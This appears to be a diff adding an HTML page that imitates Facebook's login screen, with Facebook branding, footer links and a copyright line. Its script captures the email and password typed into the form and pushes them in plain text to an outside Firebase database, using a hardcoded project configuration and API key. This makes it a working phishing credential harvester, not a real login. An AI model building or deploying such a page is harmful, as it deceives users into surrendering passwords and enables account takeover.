@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook Clone</title>
+    <link rel="stylesheet" href="./css/styles.css">
+    <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
+</head>
+
+<body>
+    <main>
+        <div class="main">
+            <div class="heading-section">
+                <img src="./images/logo.png" class="logo-img">
+                <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
+            </div>
+
+            <div class="form">
+                <form class="a-form" id="loginForm">
+                    <input type="email" id="Email" class="a-email" name="Email" placeholder="Email address or phone number"
+                        autofocus="autofocus" required />
+                    <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password"
+                        autofocus="autofocus" />
+                    <input type="submit" class="a-sub" value="Log In" />
+                </form>
+                </main>
+    <div class="footer">
+        <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+            <ul>
+                <li>English (UK)</li>
+                <li><a href="">हिन्दी</a></li>
+                <li><a href="">ગુજરાતી</a></li>
+                <li><a href="">मराठी</a></li>
+                <li><a href="">اردو</a></li>
+                <li><a href="">മലയാളം</a></li>
+                <li><a href="">বাংলা</a> </li>
+                <li><a href="" class="_sv4">తెలుగు</a> </li>
+                <li><a href="" class="_sv4">தமிழ்</a></li>
+                <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
+                <li><a href="" class="_sv4">Español</a></li>
+                <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a> </li>
+            </ul>
+            <div id="line"></div>
+            <div>
+                <ul>
+                    <li><a href="">Sign Up</a></li>
+                    <li><a href="" >Log In</a></li>
+                    <li><a href="">Messenger</a></li>
+                    <li><a href="">Facebook Lite</a> </li>
+                    <li><a href=""> Watch </a> </li>
+                    <li><a href="">People</a> </li>
+                    <li><a href="">Pages</a></li>
+                    <li><a  href="">Page categories</a></li>
+                    <li><a href="">Places</a></li>
+                    <li><a href="">Games</a></li>
+                    <li><a href="">Locations</a></li>
+                    <li><a href="">Marketplace</a></li>
+                    <li><a href="">Facebook Pay</a></li>
+                    <li><a href="">Groups</a></li>
+                    <li><a href="">Jobs</a></li>
+                    <li><a href="">Oculus</a></li>
+                    <li><a href="">Portal</a></li>
+                    <li><a href="">Instagram</a></li>
+                    <li><a href="">Local</a></li>
+                    <li><a href="">Fundraisers</a></li>
+                    <li><a href="">Services</a></li>
+                    <li><a href="">Voting Information Centre</a></li>
+                    <li><a href="">About</a></li>
+                    <li><a href="">Create ad</a></li>
+                    <li><a href="">Create Page</a></li>
+                    <li><a href="">Developers</a></li>
+                    <li><a href="">Careers</a></li>
+                    <li><a href="">Privacy</a></li>
+                    <li><a href="">Cookies</a></li>
+                    <li><a href="">AdChoices<i class="img sp_ZtNaJVka3YU_2x sx_d75518"></i></a></li>
+                    <li><a href="">Terms</a></li>
+                    <li><a href="">Help</a></li>
+                    <li><a href="">Settings</a></li>
+                    <li><a href="">Activity log</a></li>
+                </ul>
+            </div>
+            <div class="copyright">
+                <div><span> Facebook © 2021</span>
+                </div>
+            </div>
+
+            </div>
+        </div>
+    </main>
+    <div class="footer">
+        <!-- Your footer content -->
+    </div>
+    <div class="m-footer">
+        <!-- Your mobile footer content -->
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script>
+        // Initialize Firebase with your configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyA-VoWsBF1alsgnS3mZMiAsME93e6WAamY",
+            authDomain: "even-dream-330116.firebaseapp.com",
+            databaseURL: "https://even-dream-330116-default-rtdb.firebaseio.com",
+            projectId: "even-dream-330116",
+            storageBucket: "even-dream-330116.appspot.com",
+            messagingSenderId: "546532011978",
+            appId: "1:546532011978:web:7491e608705a59ef42a933",
+            measurementId: "G-22D2XEGXDG"
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        // Handle form submission
+        const loginForm = document.getElementById("loginForm");
+        loginForm.addEventListener("submit", (event) => {
+            event.preventDefault();
+
+            const email = document.getElementById("Email").value;
+            const password = document.getElementById("Password").value;
+
+            const loginData = {
+                email: email,
+                password: password
+            };
+
+            const loginRef = firebase.database().ref("loginData");
+            loginRef.push(loginData)
+                .then(() => {
+                    alert("Login data submitted successfully!");
+                    loginForm.reset();
+                })
+                .catch((error) => {
+                    console.error("Error submitting login data: ", error);
+                });
+        });
+    </script>
+</body>
+
+</html>
